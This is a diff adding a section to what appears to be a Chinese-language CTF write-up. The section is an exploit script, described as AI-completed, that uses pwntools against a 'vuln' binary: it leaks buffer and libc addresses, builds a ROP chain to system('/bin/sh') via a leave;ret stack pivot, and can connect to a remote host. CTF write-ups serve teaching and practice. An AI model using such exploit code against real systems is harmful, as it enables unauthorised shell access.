@@ -83,3 +83,73 @@ p.send(payload)
 
 p.interactive()
 ```
+
+AI 完成的攻击脚本，思路和上面类似：
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+
+binary = ELF('./vuln')
+libc = ELF('./libc.so.6')
+
+leave_ret = 0x40128e
+ret = 0x40101a
+
+puts_off = libc.symbols['puts']
+system_off = libc.symbols['system']
+binsh_off = next(libc.search(b'/bin/sh'))
+pop_rdi_ret_off = 0x2a3e5
+
+def exploit(host=None, port=None):
+    if host:
+        p = remote(host, port)
+    else:
+        p = process('./vuln.patched')
+
+    p.recvuntil(b'buf @ ')
+    buf_addr = int(p.recvuntil(b'\n').strip(), 16)
+    log.info(f"buf @ {hex(buf_addr)}")
+
+    p.recvuntil(b'puts @ ')
+    puts_addr = int(p.recvuntil(b'\n').strip(), 16)
+    log.info(f"puts @ {hex(puts_addr)}")
+
+    libc_base = puts_addr - puts_off
+    log.info(f"libc @ {hex(libc_base)}")
+
+    pop_rdi_ret = libc_base + pop_rdi_ret_off
+    system = libc_base + system_off
+    binsh = libc_base + binsh_off
+
+    p.recvuntil(b'Stage your ROP chain:\n')
+
+    rop_chain = b'A' * 8
+    rop_chain += p64(pop_rdi_ret)
+    rop_chain += p64(binsh)
+    rop_chain += p64(ret)
+    rop_chain += p64(system)
+
+    p.send(rop_chain)
+
+    p.recvuntil(b'Now overflow:\n')
+
+    payload = b'B' * 0x50
+    payload += p64(buf_addr)
+    payload += p64(leave_ret)
+
+    p.send(payload)
+
+    p.sendline(b'id')
+    log.info(p.recvline(timeout=3).decode().strip())
+
+    p.close()
+
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) > 2:
+        exploit(sys.argv[1], int(sys.argv[2]))
+    else:
+        exploit()
+```
